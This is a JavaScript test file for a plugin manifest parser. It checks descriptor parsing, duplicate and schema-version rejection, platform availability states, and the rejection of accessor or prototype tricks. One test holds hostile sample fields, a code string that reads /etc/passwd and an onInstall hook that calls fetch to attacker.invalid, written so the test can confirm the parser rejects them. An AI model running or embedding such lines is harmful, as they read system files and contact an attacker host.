import test from 'node:test';
import assert from 'node:assert/strict';
import {
  acceptUiContribution,
  parseUiContribution,
  uiContributionAvailability,
} from '../dist/plugin-ui.js';
import {
  nativeProviderKey,
  nativeProviderSatisfies,
  parseNativeProvider,
} from '../dist/plugin-native.js';

/** A serialized contribution descriptor as a real package manifest would
 * project it: the same JSON must decode identically in TS and Kotlin. */
const sample = JSON.stringify({
  id: 'notes.reader', kind: 'reader', apiVersion: '1',
  platforms: ['web', 'mac', 'android'],
  requires: [{id: 'evidence.read', version: '1', host: 'server'}],
  nativeRequires: [{capability: 'media.playback', apiVersion: '1', platforms: ['mac', 'android'], fallback: 'generic-reader'}],
  presentation: {labelKey: 'notes.reader.title', i18nNamespace: 'mote.notes', glyphKey: 'icon.doc'},
  data: {schemaRef: 'mote.note', schemaVersion: 1},
  commands: [{id: 'notes.open', apiVersion: '1'}],
  draftScope: 'plugin-instance',
});

test('real manifest contribution round-trips with stable identity', () => {
  const parsed = parseUiContribution(JSON.parse(sample));
  assert.equal(parsed.id, 'notes.reader');
  assert.equal(parsed.kind, 'reader');
  assert.equal(parsed.apiVersion, '1');
  assert.deepEqual(parsed.platforms, ['web', 'mac', 'android']);
  assert.equal(parsed.draftScope, 'plugin-instance');
  // Deterministic re-serialization keeps the same wire identity for Kotlin.
  assert.equal(parseUiContribution(JSON.parse(JSON.stringify(parsed))).id, 'notes.reader');
});

test('duplicate contribution is rejected whole and keeps the existing entry', () => {
  const existing = [{packageId: 'pkg.notes', descriptor: parseUiContribution(JSON.parse(sample))}];
  const duplicate = {packageId: 'pkg.notes', descriptor: parseUiContribution(JSON.parse(sample))};
  const result = acceptUiContribution(existing, duplicate);
  assert.equal(result.accepted, false);
  if (!result.accepted) assert.equal(result.rejection.reason, 'conflict');
  assert.equal(existing.length, 1);
  // The same contribution id in a different package is a distinct identity.
  const other = {packageId: 'pkg.photos', descriptor: parseUiContribution(JSON.parse(sample))};
  assert.deepEqual(acceptUiContribution(existing, other, {'mote.note': [1]}), {accepted: true});
});

test('unsupported data schema version is rejected without touching accepted set', () => {
  const existing = [{packageId: 'pkg.notes', descriptor: parseUiContribution(JSON.parse(sample))}];
  const candidate = (data, id = 'notes.reader.v2') => ({packageId: 'pkg.notes', descriptor: parseUiContribution({...JSON.parse(sample), id, data})});
  const rejected = acceptUiContribution(existing, candidate({schemaRef: 'mote.note', schemaVersion: 9}), {'mote.note': [1]});
  assert.equal(rejected.accepted, false);
  if (!rejected.accepted) assert.equal(rejected.rejection.reason, 'api_incompatible');
  assert.deepEqual(acceptUiContribution(existing, candidate({schemaRef: 'mote.note', schemaVersion: 9}), {'mote.note': [1, 9]}), {accepted: true});
  // An absent schemaRef, an empty support map and a prototype-named schema
  // all reject deterministically instead of being admitted or crashing.
  for (const map of [{}, {'mote.note': [1]}])
    assert.equal(acceptUiContribution(existing, candidate({schemaRef: 'mote.unknown', schemaVersion: 9}), map).accepted, false);
  const proto = acceptUiContribution(existing, candidate({schemaRef: 'toString', schemaVersion: 1}), {'mote.note': [1]});
  assert.equal(proto.accepted, false);
  if (!proto.accepted) assert.equal(proto.rejection.reason, 'api_incompatible');
});

test('captured content resembling a plugin definition never becomes a descriptor', () => {
  const captured = JSON.stringify({
    id: 'evil.reader', kind: 'page', apiVersion: '1', platforms: ['web'],
    presentation: {labelKey: 'x', i18nNamespace: 'y'},
    code: 'require("fs").readFileSync("/etc/passwd")',
    onInstall: '() => fetch("https://attacker.invalid")',
  });
  assert.throws(() => parseUiContribution(JSON.parse(captured)), TypeError);
  assert.throws(() => parseUiContribution({
    id: 'evil', kind: 'page', apiVersion: '1', platforms: ['web'],
    presentation: {labelKey: 'x', i18nNamespace: 'y'},
    handler: () => {},
  }), TypeError);
  // Accessors on otherwise valid top-level, nested and provider descriptors
  // are rejected before any getter executes.
  let calls = 0;
  const validTop = JSON.parse(sample);
  Object.defineProperty(validTop, 'id', {get() { calls++; return 'notes.reader'; }, enumerable: true});
  assert.throws(() => parseUiContribution(validTop), TypeError);
  const nested = JSON.parse(sample);
  Object.defineProperty(nested.presentation, 'labelKey', {get() { calls++; return 'x'; }, enumerable: true});
  assert.throws(() => parseUiContribution(nested), TypeError);
  const provider = {capability: 'c', apiVersion: '1', platform: 'mac', buildId: 'b'};
  Object.defineProperty(provider, 'buildId', {get() { calls++; return 'b'; }, enumerable: true});
  assert.throws(() => parseNativeProvider(provider), TypeError);
  assert.equal(calls, 0);
  // Empty-string string-form dependencies are rejected like malformed object ids.
  assert.throws(() => parseUiContribution({...JSON.parse(sample), requires: ['']}), TypeError);
});

test('missing required native provider is requires-build, not a fake enabled state', () => {
  const descriptor = parseUiContribution(JSON.parse(sample));
  const availability = uiContributionAvailability(descriptor, 'mac', {
    requirementsAvailable: true,
    registeredNativeCapabilities: new Set(),
  });
  assert.deepEqual(availability, {state: 'requires-build', reason: 'requires_build'});
  // Registering the provider activates the contribution on that platform.
  const registered = new Set([nativeProviderKey({capability: 'media.playback', apiVersion: '1'})]);
  assert.deepEqual(uiContributionAvailability(descriptor, 'mac', {
    requirementsAvailable: true, registeredNativeCapabilities: registered,
  }), {state: 'active'});
  // The same provider requirement does not apply to web.
  assert.deepEqual(uiContributionAvailability(descriptor, 'web', {
    requirementsAvailable: true, registeredNativeCapabilities: new Set(),
  }), {state: 'active'});
});

test('unsupported platform, revoked grant and waiting device stay distinct', () => {
  const descriptor = parseUiContribution(JSON.parse(sample));
  const webOnly = parseUiContribution({...JSON.parse(sample), platforms: ['web']});
  assert.deepEqual(uiContributionAvailability(webOnly, 'android', {
    requirementsAvailable: true, registeredNativeCapabilities: new Set(),
  }), {state: 'unsupported', reason: 'platform_unsupported'});
  assert.deepEqual(uiContributionAvailability(descriptor, 'mac', {
    requirementsAvailable: true, registeredNativeCapabilities: new Set([nativeProviderKey({capability: 'media.playback', apiVersion: '1'})]),
    revoked: true,
  }), {state: 'revoked', reason: 'revoked'});
  assert.deepEqual(uiContributionAvailability(descriptor, 'mac', {
    requirementsAvailable: true, registeredNativeCapabilities: new Set([nativeProviderKey({capability: 'media.playback', apiVersion: '1'})]),
    deviceUnavailable: true,
  }), {state: 'waiting-device', reason: 'waiting_device'});
});

test('declared OS grants do not alter capability availability', () => {
  const provider = parseNativeProvider({
    capability: 'media.playback', apiVersion: '1', platform: 'mac',
    buildId: 'mac-2026.11.02', osGrants: ['screen-recording', 'accessibility'],
  });
  assert.equal(provider.osGrants?.length, 2);
  const requirement = {capability: 'media.playback', apiVersion: '1', platforms: ['mac'], fallback: 'generic-reader'};
  assert.equal(nativeProviderSatisfies(requirement, provider), true);
  // A grant hint never proves authorization and never changes satisfaction.
  assert.equal(nativeProviderSatisfies(requirement, parseNativeProvider({
    capability: 'media.playback', apiVersion: '1', platform: 'mac', buildId: 'other-build',
  })), true);
  assert.equal(nativeProviderSatisfies(requirement, parseNativeProvider({
    capability: 'media.playback', apiVersion: '2', platform: 'mac', buildId: 'mac-2026.11.02',
  })), false);
});

test('malformed descriptors and native providers are rejected', () => {
  for (const input of [
    null, [], 'x', {id: 1, kind: 'page', apiVersion: '1', platforms: ['web'], presentation: {}},
    {id: 'a', kind: 'unknown-kind', apiVersion: '1', platforms: ['web'], presentation: {labelKey: 'x', i18nNamespace: 'n'}},
    {id: 'a', kind: 'page', apiVersion: '1', platforms: [], presentation: {labelKey: 'x', i18nNamespace: 'n'}},
  ]) assert.throws(() => parseUiContribution(input), TypeError);
  assert.throws(() => parseNativeProvider({capability: 'c', apiVersion: '1', platform: 'ios', buildId: 'b'}), TypeError);
  assert.throws(() => parseNativeProvider({capability: 'c', apiVersion: '1', platform: 'mac', buildId: 'b', osGrants: [{}]}), TypeError);
});

test('accessor array elements and overridden array methods never execute', () => {
  let calls = 0;
  const base = () => JSON.parse(sample);
  // A plain array whose element is an accessor: rejected before the getter runs.
  const accessorElements = base();
  Object.defineProperty(accessorElements.platforms, '0', {get() { calls++; return 'web'; }, enumerable: true});
  assert.throws(() => parseUiContribution(accessorElements), TypeError);
  // An Array.prototype array with own every/map overrides: rejected before any call.
  const overridden = base();
  overridden.platforms.every = () => { calls++; return true; };
  overridden.requires = ['evidence.read@1'];
  overridden.requires.map = () => { calls++; return []; };
  assert.throws(() => parseUiContribution(overridden), TypeError);
  assert.equal(calls, 0);
});
